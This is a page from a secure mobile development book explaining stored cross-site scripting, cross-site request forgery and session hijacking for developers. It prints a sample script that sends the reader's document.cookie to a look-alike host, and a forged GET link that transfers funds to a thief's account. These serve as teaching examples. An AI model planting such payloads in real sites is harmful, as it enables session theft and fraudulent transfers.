  md: "**18**\n\n**Secure Development for Mobile Apps\uFEFF**\n\nThis attack is dangerous\
    \ because it can usually be saved on a site, such as in a blog\n\npost, and then\
    \ executed when another user wants to read that post. By reading the\n\npost with\
    \ the saved and embedded script, the user unknowingly causes the script to\n\n\
    be executed in his browser. If the script is like the one below, then the user\
    \ ends up\n\nsending his cookies to what looks like a legitimate site at first\
    \ glance.\n\n<sc\aript>window.location = 'http://mybank.com.it/main.php?var =\n\
    \n'+document.cookie;</script>\n\nNotice that the variable being sent as part of\
    \ the GET request is the document\n\ncookie, which could contain an active session\
    \ cookie. If so, then the people running\n\nmybank.com.it would now have your\
    \ active session cookie and could log into the site\n\nthat cookie belongs to.\n\
    \n*Cross-Site Request Forgery*\n\nCross-Site Request Forgery is a more complicated\
    \ attack. It involves tricking a user’s\n\nbrowser into making a forged request.\
    \ This can work silently behind the scenes if a\n\nuser is currently logged into\
    \ a website, say his bank, and he clicks on a link containing\n\nJavaScript that\
    \ makes a request to his bank using the active session cookie. An attack\n\ncould\
    \ look like the following. If a user’s bank is MyBankCorp.com, and he is currently\n\
    \nlogged in to that bank and then concurrently browses over to MyChatRoom.com\
    \ to\n\nchat with a friend and clicks on a post saying “Check it Out,” and if\
    \ the link to that\n\npost contained JavaScript that looked like the following,\n\
    \nhref \a= \"http://mybankcorp.com/transfer?account = Jack&amount = 20&deposit\n\
    \n= thiefaccount\"\n\nthen a forged request would take place at the user’s bank,\
    \ using the active session\n\ncookie. This cookie would authenticate the request,\
    \ because it is already authenticated\n\nand, because it is a GET request, the\
    \ transfer of funds from the user’s account to the\n\nhacker’s account would take\
    \ place without the user ever being aware of it until he looks\n\nat his monthly\
    \ statement. By keeping the transferred amount of money small, such\n\nas $20,\
    \ the user might not notice it in his statement and would never know the attack\n\
    \nsuccessfully occurred.\n\nThe reason this works is because of the trust that\
    \ MyBankCorp.com has in the\n\nauthenticated cookie, and it blindly executes commands\
    \ on its behalf. In order to pre­\n\nvent this, steps need to be taken in the\
    \ server code to further verify actions as legitimate.\n\n*Session Hijacking*\n\
    \nSession hijacking is when someone else grabs your session cookie. Your session\
    \ cookie\n\nusually identifies you. If another user is able to obtain this cookie\
    \ and insert it into his\n\nown browser, then he can hijack your session and impersonate\
    \ you."
